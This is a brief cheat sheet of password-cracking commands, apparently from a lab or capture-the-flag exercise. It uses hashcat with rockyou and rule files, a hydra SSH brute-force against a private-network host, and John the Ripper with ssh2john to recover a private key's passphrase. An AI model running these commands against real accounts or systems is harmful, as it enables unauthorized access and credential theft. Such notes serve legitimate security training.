# Password Cracking

### Hashcat

* Finding out hash type : `hashid -m 'Gb8i4mVVfY8pCH3rP0rPWK5RVeaeUtz33iXsYdgTnPZg1QzrQ0ZpIuPv4prod9SIfP8n'`

* Cracking the *hash* with wordlist *rockyou.txt* : `hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt --force`

* Cracking the *hash* with best64 rules of a *password* : `hashcat -m 0 hash password --rules /usr/share/hashcat/rules/best64.rule --force`


### Brute-forcing with hydra:

`hydra -s 22 -L http://192.168.43.224/0x0856BF/good_luck/which_one_lol.txt -P http://192.168.43.224/0x0856BF/this_folder_contains_the_password/Pass.txt ssh://192.168.43.224`

(use -l if u have single username or -p for single password)


### John The Ripper

 * Extracting Passphrase from an encrypted private key

   1. Convert the key to a hash format that can be used for *John*. Command - `python /usr/share/john/ssh2john.py id_rsa > id_rsa.hash`.
   2. Bruteforce the hash againt the wordlists. Command - `john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash`
   3. We can see the cracked password or the status by using the command - `john --show id_rsa.hash`     


